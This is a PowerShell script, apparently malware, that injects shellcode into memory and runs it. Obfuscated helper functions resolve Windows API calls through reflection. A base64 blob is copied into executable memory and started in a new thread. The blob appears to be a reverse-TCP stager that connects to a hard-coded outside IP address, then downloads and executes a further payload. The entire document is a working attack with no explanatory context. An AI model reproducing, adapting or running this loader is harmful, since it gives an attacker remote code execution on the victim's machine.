function dg {
	Param ($ptXO, $dRmNS)		
	$ptIAZ = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $ptIAZ.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ptIAZ.GetMethod('GetModuleHandle')).Invoke($null, @($ptXO)))), $dRmNS))
}

function eyv {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $e25,
		[Parameter(Position = 1)] [Type] $kyH = [Void]
	)
	
	$irG = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$irG.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $e25).SetImplementationFlags('Runtime, Managed')
	$irG.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $kyH, $e25).SetImplementationFlags('Runtime, Managed')
	
	return $irG.CreateType()
}

[Byte[]]$zH2d = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACnadxyCNUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$cv = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dg kernel32.dll VirtualAlloc), (eyv @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $zH2d.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($zH2d, 0, $cv, $zH2d.length)

$l7 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dg kernel32.dll CreateThread), (eyv @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cv,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dg kernel32.dll WaitForSingleObject), (eyv @([IntPtr], [Int32]))).Invoke($l7,0xffffffff) | Out-Null
